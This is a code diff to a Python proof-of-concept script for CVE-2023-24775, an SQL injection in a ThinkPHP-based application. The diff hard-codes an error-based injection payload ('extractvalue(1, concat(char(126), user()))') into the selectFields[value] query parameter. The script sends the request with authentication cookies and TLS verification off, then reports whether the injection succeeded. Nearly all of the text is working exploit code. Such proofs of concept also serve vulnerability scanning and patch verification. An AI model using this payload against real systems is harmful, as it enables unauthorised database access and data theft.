@@ -37,19 +37,23 @@ def scan_cve_2023_24775(profile_url):
         'think_lang': 'zh-cn',
     }
 
-    sqli = input("Input selectFields[name]=name&selectFields[value]=your select sqli: ")
-    if not sqli:
-        sqli = "extractvalue(1, concat(char(126), user()))"
-    else:
-        sqli = urllib.parse.quote_plus(sqli)
+    sqli = "extractvalue(1, concat(char(126), user()))"
+    profile_url += f"selectFields%5Bname%5D=name&selectFields%5Bvalue%5D={urllib.parse.quote_plus(sqli)}"
 
-    url += f"selectFields%5Bname%5D=name&selectFields%5Bvalue%5D={sqli}"
     print(f"Request URL: {profile_url}")
 
-    sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
-    print(sqli_request.text)
+    try:
+        sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
+        print(sqli_request.text)
 
-    if 'message' in sqli_request.text:
-        print('**POC CVE-2023-24775: SQLi works** :)')
-    else:
-        print('**POC CVE-2023-24775: SQLi does not worked** :(')
+        if 'message' in sqli_request.text:
+            print('**POC CVE-2023-24775: SQLi works** :)')
+            return True  
+        else:
+            print('**POC CVE-2023-24775: SQLi did not work** :(')
+            return False  
+
+    except Exception as e:
+        print(f"[ERROR] An exception occurred: {str(e)}")
+        return False 
+
